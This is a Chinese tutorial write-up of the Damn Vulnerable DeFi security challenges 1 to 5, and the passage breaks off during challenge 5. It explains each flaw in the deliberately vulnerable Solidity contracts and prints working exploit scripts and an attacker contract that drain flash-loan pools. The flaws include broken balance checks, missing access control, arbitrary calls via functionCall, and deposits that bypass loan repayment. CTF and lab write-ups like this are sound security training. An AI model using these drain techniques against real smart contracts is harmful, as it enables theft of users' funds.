

# 奇安信攻防社区-Damn Vulnerable DeFi Challenges

### Damn Vulnerable DeFi Challenges

Damn Vulnerable DeFi Challenges | 区块链安全挑战

## 前言

~应该是全网写的最容易明白的了~

需要会用hardhat [Getting started with Hardhat | Ethereum development environment for professionals by Nomic Foundation](https://hardhat.org/hardhat-runner/docs/getting-started)

推荐做前看看:[Opinionated security and code quality standard for Solidity smart contracts](https://github.com/transmissions11/solcurity)和[A collection of smart contract vulnerabilities along with prevention methods](https://github.com/kadenzipfel/smart-contract-vulnerabilities)

需要了解一些简单的js语法,为了和sol交互(不用单独学,用着用着就差不多了)

个人觉得hardhat不好用,不如[Foundry](https://learnblockchain.cn/docs/foundry/i18n/zh/)

- - -

2023-11-27 S7iter

正式开始

## Challenge #1 - Unstoppable

> There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
> 
> To pass the challenge, make the vault stop offering flash loans.
> 
> You start with 10 DVT tokens in balance.

这次挑战的内容是:为了通过挑战，让金库停止提供闪贷。

首先我们要了解代币经济模型逻辑之一：

```js
//UnstoppableVault.sol：  
   constructor(ERC20 \_token, address \_owner, address \_feeRecipient)  
        ERC4626(\_token, "Oh Damn Valuable Token", "oDVT")  
        Owned(\_owner)  
    {  
        feeRecipient = \_feeRecipient;  
        emit FeeRecipientUpdated(\_feeRecipient);  
    }
```

然后我们分析代码,我们需要找到关键点。在于：

```js
//UnstoppableVault.sol：  
function flashLoan(  
        //....//  
    ) external returns (bool) {  
        if (amount == 0) revert InvalidAmount(0); // fail early  
        if (address(asset) != \_token) revert UnsupportedCurrency(); // enforce ERC3156 requirement  
        uint256 balanceBefore = totalAssets();  
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement  
        uint256 fee = flashFee(\_token, amount);  
        // transfer tokens out + execute callback on receiver  
        ERC20(\_token).safeTransfer(address(receiver), amount);  
        // callback must return magic value, otherwise assume it failed  
        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))  
            revert CallbackFailed();  
        // pull amount + fee from receiver, then pay the fee to the recipient  
        ERC20(\_token).safeTransferFrom(address(receiver), address(this), amount + fee);  
        ERC20(\_token).safeTransfer(feeRecipient, fee);  
        return true;  
    }
```

观察其中：

```js
uint256 balanceBefore = totalAssets();  
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

结合经济代币模型:**assets**表示用户从Vault仓库(可以理解为代币池)中存入和取出的基础代币DAT, Shares表示存入DVT后获得的根据比例获得的oDVT

`asset`是资产底层通证 `share`就是股权通证 在本题合约中是1:1兑换的

```js
// unstoppable.challenge.js  
const TOKENS\_IN\_VAULT = 1000000n \* 10n \*\* 18n;  

await token.approve(vault.address, TOKENS\_IN\_VAULT);  
await vault.deposit(TOKENS\_IN\_VAULT, deployer.address);
```

根据ERC4626代币标准[ERC-4626 代币化资金库标准 | ethereum.org](https://ethereum.org/zh/developers/docs/standards/tokens/erc-4626/)

·totalSupply只能通过 [mint](https://ethereum.org/zh/developers/docs/standards/tokens/erc-4626/#mint) 和 [deposit](https://ethereum.org/zh/developers/docs/standards/tokens/erc-4626/#deposit) 方法将代币存入资金库之前发出

·balanceBefore 可通过 DVT 的 transfer 增加

其实这道题目就是让 `convertToShares(totalSupply) != balanceBefore`

那么我们就可以通过直接调用token.transfer 这样就不会使share发生改变,那么两者就不相等了

那么我们可以直接调用unstoppable.challenge.js中 const INITIAL\_PLAYER\_TOKEN\_BALANCE = 10n \* 10n \*\* 18n; 来使不相等,也可以直接发送代币来使之不相等,数额大小无所谓。

Exp:

```js
//unstoppable.challenge.js  
    it('Execution', async function () {  
        /\*\* CODE YOUR SOLUTION HERE \*/  
        // token = token.connect(player);  
        // await token.transfer(vault.address, 一个数值或者调用INITIAL\_PLAYER\_TOKEN\_BALANCE);  
        await token.connect(player).transfer(vault.address, 任意数值 比如1)  
    });
```

run:

```js
\[Challenge\] Unstoppable  
  ✔ Execution  
1 passing (2s)   //通过
```

## Challenge #2 - Naive receiver

> There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
> 
> A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
> 
> Take all ETH out of the user’s contract. If possible, in a single transaction.

这次的挑战的内容是:将所有 ETH 从用户合同中取消。如果可能的话，在一次交易中。

在看代码前,我先run一下test,看看会回显什么：

```js
1) \[Challenge\] Naive receiver  
     "after all" hook for "Execution":  
    AssertionError: expected 10000000000000000000 to equal 0. The numerical values of the given "ethers.BigNumber" and "number" inputs were compared, and they differed.  
    + expected - actual  
    -10000000000000000000  
    +0
```

这道题比较容易理解

我们可以看到10000000000000000000也就是10Ether

在线WEI，Ether转换可以用这个网站[Ethereum Unit Converter | Ether to Gwei, Wei, Finney, Szabo, Shannon etc. (eth-converter.com)](https://eth-converter.com/)

在NaiveReceiverLenderPool.sol文件中：

```js
function flashLoan(  
        IERC3156FlashBorrower receiver,  
        address token,  
        uint256 amount,  
        bytes calldata data  
    ) external returns (bool) {  
        if (token != ETH)  
            revert UnsupportedCurrency();  

        uint256 balanceBefore = address(this).balance;  

        // Transfer ETH and handle control to receiver  
        SafeTransferLib.safeTransferETH(address(receiver), amount);  
        if(receiver.onFlashLoan(  
            msg.sender,  
            ETH,  
            amount,  
            FIXED\_FEE,  
            data  
        ) != CALLBACK\_SUCCESS) {  
            revert CallbackFailed();  
        }  

        if (address(this).balance < balanceBefore + FIXED\_FEE)  
            revert RepayFailed();  

        return true;  
    }
```

调用的接口:[ERC-3156: Flash Loans (ethereum.org)](https://eips.ethereum.org/EIPS/eip-3156)

该合约以固定的 1 ETH 费用提供闪电贷，然后闪电贷后，合约验证其更新的余额是否超过原始余额加上 1 ETH 费用

对于FlashLoanReceiver.sol

```js
function onFlashLoan(  
    address,  
    address token,  
    uint256 amount,  
    uint256 fee,  
    bytes calldata  
) external returns (bytes32) {  
    assembly { // gas savings  
        if iszero(eq(sload(pool.slot), caller())) {  
            mstore(0x00, 0x48f5c3ed)  
            revert(0x1c, 0x04)  
        }  
    }  

    if (token != ETH)  
        revert UnsupportedCurrency();  

    uint256 amountToBeRepaid;  
    unchecked {  
        amountToBeRepaid = amount + fee;  //偿还贷款 + 1 ETH fee。  
    }  
    \_executeActionDuringFlashLoan();  

    // Return funds to pool  
    SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);  

    return keccak256("ERC3156FlashBorrower.onFlashLoan");  
}
```

我们看方法中的参数, 可以发现第一个`address`未被使用,并且这是闪电贷发起账户的msg.sender

并且对于上述两个合约代码,我们可以发现都没对函数进行检查

那么就导致了访问控制的问题了,我们可以用此账户来代表FlashLoanReceiver(接收闪电贷的账户)执行交易

那么我们就可以用FlashLoanReceiver中的msg.sender去执行10次onFlashLoan函数

Exp:

```js
// 10 transactions  
const ETH = await pool.ETH();  
for(let i = 0; i < 10; i++){  
    await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x"); //"0x" 作为一个空的十六进制字符串，只是为了符合flashLoan方法中的data  
}
```

run:

```js
\[Challenge\] Naive receiver  
  ✔ Execution (123ms)  
1 passing (2s)
```

## Challenge #3 - Truster

> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
> 
> The pool holds 1 million DVT tokens. You have nothing.
> 
> To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

这次挑战的内容：要通过此挑战，请从池中取出所有令牌

根据题目,我们要掏空池子里面的100W个DVT代币,这道题目只有一份合约:

TrusterLenderPool.sol

```js
contract TrusterLenderPool is ReentrancyGuard {  
    using Address for address;  

    DamnValuableToken public immutable token;  

    error RepayFailed();  

    constructor(DamnValuableToken \_token) {  
        token = \_token;  
    }  

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)  
        external  
        nonReentrant  
        returns (bool)  
    {  
        uint256 balanceBefore = token.balanceOf(address(this));  

        token.transfer(borrower, amount);  
        target.functionCall(data);  

        if (token.balanceOf(address(this)) < balanceBefore)  
            revert RepayFailed();  

        return true;  
    }  
}
```

DamnValuableToken.sol只是实现了一个ERC20代币

其中主要观察flashloasn函数 其中有两种类型的地址 borrower和target,同时还调用了functionCall[functionCall](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-)

这样 我们就可以我们的pool合约与target和data合约进行交互, 我们可以用pool的msg.sender作为调用者

其实就是`target.functionCall(data)` 可以以 `TrusterLenderPool` 的身份调用任意合约的任意函数

因为使用了ERC20.那么可以使用`approve`来完成这笔交易[](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20)[ERC 20 - OpenZeppelin Docs](https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-approve-address-uint256-)

我们要将掏空100W个闪电贷, 因为闪电贷原理,我们无法在用一个交易中窃取. 那么我们可以创建另一组交易

被闪电贷这笔交易允许,然后再另一个交易中获取代币

我们可以让Pool合约批准我们使用其所有 DVT 代币。然后用 transferFrom调用

Exp:

```js
    it('Execution', async function () {  
        /\*\* CODE YOUR SOLUTION HERE \*/  
        let interface = new ethers.utils.Interface(\["function approve(address spender, uint256 amount)"\])  
        let data = interface.encodeFunctionData("approve", \[player.address, TOKENS\_IN\_POOL\]); //！  

        await pool.connect(player).flashLoan(0, player.address, token.address, data);  
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS\_IN\_POOL)  
    });  
//注意0只是为了实现一个通证
```

run:

```js
\[Challenge\] Truster  
  ✔ Execution (42ms)  
1 passing (2s)
```

## Challenge #4 - Side Entrance

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
> 
> It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
> 
> Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

这次挑战的内容：从余额 1 ETH 开始，通过从池中取出所有 ETH 来通过挑战。

对于这把challenge，我们先看一下合约代码。也是比较简单,只有一个SideEntraceLenderPool.sol文件

```js
interface IFlashLoanEtherReceiver {  
    function execute() external payable;  
}  

contract SideEntranceLenderPool {  
    mapping(address => uint256) private balances; // 用户余额映射  

    error RepayFailed();  

    event Deposit(address indexed who, uint256 amount);  
    event Withdraw(address indexed who, uint256 amount);  

    function deposit() external payable {      //允许用户将 ETH 存入池子  
        unchecked {  
            balances\[msg.sender\] += msg.value;  
        }  
        emit Deposit(msg.sender, msg.value);  //更新发送者地址的余额并发出存款事件  
    }  

    function withdraw() external {  
        uint256 amount = balances\[msg.sender\];  

        delete balances\[msg.sender\];  
        emit Withdraw(msg.sender, amount);  

        SafeTransferLib.safeTransferETH(msg.sender, amount);  // 使用SafeTransferLib安全提现以太币  
    }  
    //用户可以使用此功能发起提现。它检索发送方的当前余额，删除用户的余额记录，发出提现事件，并将全部 ETH 金额转回发送方。  

    function flashLoan(uint256 amount) external {  
        uint256 balanceBefore = address(this).balance;  

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();  

        if (address(this).balance < balanceBefore)  // 如果合约余额小于执行借贷前的余额，表示还款失败，触发还款失败错误  
            revert RepayFailed();  
    }  
}
```

FlashLoan()是具有借和还的功能,并且都是通过transfer来实现的,并没有进行特别的校验,只通过address(this).balance < balanceBefore 来检查.但是SideEntranceLenderPool还提供了存入功能,并且没有做任何的限制,也就是说,可以通过SideEntranceLenderPool合约提供的deposit来绕过FlanshLoan()的验证,然后在进行withdraw取钱

那么我们就可以 先存入钱,再取出。（正常流程是通过闪电贷进行取出(借)和存入(还)）

也就是说 在闪电贷时候 原本是偿还的 但是我们使用存款,那么是存款我们就可以自己取出来。打到掏空Pool的效果

Exp:

```js
contract SideEntranceHacker is IFlashLoanEtherReceiver {  

    SideEntranceLenderPool pool;  

    constructor(address instance) {  
        pool = SideEntranceLenderPool(instance);  
    }  

    function exploit() external payable {  
        pool.flashLoan(1000 ether);  
        pool.withdraw();  
        payable(tx.origin).transfer(1000 ether);  
    }  

    function execute() external payable {  
        pool.deposit{value: 1000 ether}();  
    }  

    receive() external payable {}  
}
```

challenges.js

```js
it('Execution', async function () {  
    let hacker = await (await ethers.getContractFactory('SideEntranceHacker', player)).deploy(pool.address);  
    await hacker.exploit();  
});
```

run:

```js
\[Challenge\] Side entrance  
  ✔ Execution (58ms)  
1 passing (2s)
```

## Challenge #5 - The Rewarder

> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
> 
> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
> 
> You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
> 
> By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

这次挑战的内容：在没有DAT代币的情况下去领取出来大部分奖励

game给了4个sol文件,首先需要先来简单分析下:

对于

**AccountingToken.sol**

```js
contract AccountingToken is ERC20Snapshot, OwnableRoles {  
    uint256 public constant MINTER\_ROLE = \_ROLE\_0;  
    uint256 public constant SNAPSHOT\_ROLE = \_ROLE\_1;  
    uint256 public constant BURNER\_ROLE = \_ROLE\_2;  

    error NotImplemented();  

    constructor() ERC20("rToken", "rTKN") {   //rToken为代币名称 rTKN为代币符号  
        \_initializeOwner(msg.sender);  
        \_grantRoles(msg.sender, MINTER\_ROLE | SNAPSHOT\_ROLE | BURNER\_ROLE);  
    }  

    function mint(address to, uint256 amount) external onlyRoles(MINTER\_ROLE) {  
        \_mint(to, amount);  
    }  

    function burn(address from, uint256 amount) external onlyRoles(BURNER\_ROLE) {  
        \_burn(from, amount);  
    }  

    function snapshot() external onlyRoles(SNAPSHOT\_ROLE) returns (uint256) {  
        return \_snapshot();  
    }  

    function \_transfer(address, address, uint256) internal pure override {  
        revert NotImplemented();  
    }  

    function \_approve(address, address, uint256) internal pure override {  
        revert NotImplemented();  
    }  
}
```

简单来说：合约在构造函数中初始化了合约所有者(msg.sender)，并授予了合约所有者具有铸造者(MINTER\_ROLE)、快照(SNAPSHOT\_ROLE)和销毁者(BURNER\_ROLE)角色的权限。

`mint`函数，只有具有铸造者角色的地址才能调用该函数来铸造代币。

`burn`函数，只有具有销毁者角色的地址才能调用该函数来销毁代币。

`snapshot`函数，用于创建代币快照，只有具有快照角色的地址调用。

**FlashLoanerPool.sol：**

```js
constructor(address liquidityTokenAddress) {  
    liquidityToken = DamnValuableToken(liquidityTokenAddress); //接收一个流动性代币地址，并将其用于初始化"liquidityToken"实例。  
}  

function flashLoan(uint256 amount) external nonReentrant {  
    uint256 balanceBefore = liquidityToken.balanceOf(address(this));  

    if (amount > balanceBefore) {  
        revert NotEnoughTokenBalance();  
    }  

    if (!msg.sender.isContract()) {  
        revert CallerIsNotContract();  
    }  

    liquidityToken.transfer(msg.sender, amount); //！  

    msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));  

    if (liquidityToken.balanceOf(address(this)) < balanceBefore) {  
        revert FlashLoanNotPaidBack();  
    }  
}
```

比较简单,就不多说了 该合约是一个简单的池子，用于获取DVT代币的闪电贷款

**RewardToken.sol**

```js
contract RewardToken is ERC20, OwnableRoles {  
    uint256 public constant MINTER\_ROLE = \_ROLE\_0;  

    constructor() ERC20("Reward Token", "RWT") {  
        \_initializeOwner(msg.sender);  
        \_grantRoles(msg.sender, MINTER\_ROLE);  
    }  

    function mint(address to, uint256 amount) external onlyRoles(MINTER\_ROLE) {  
        \_mint(to, amount);  
    }  
}
```
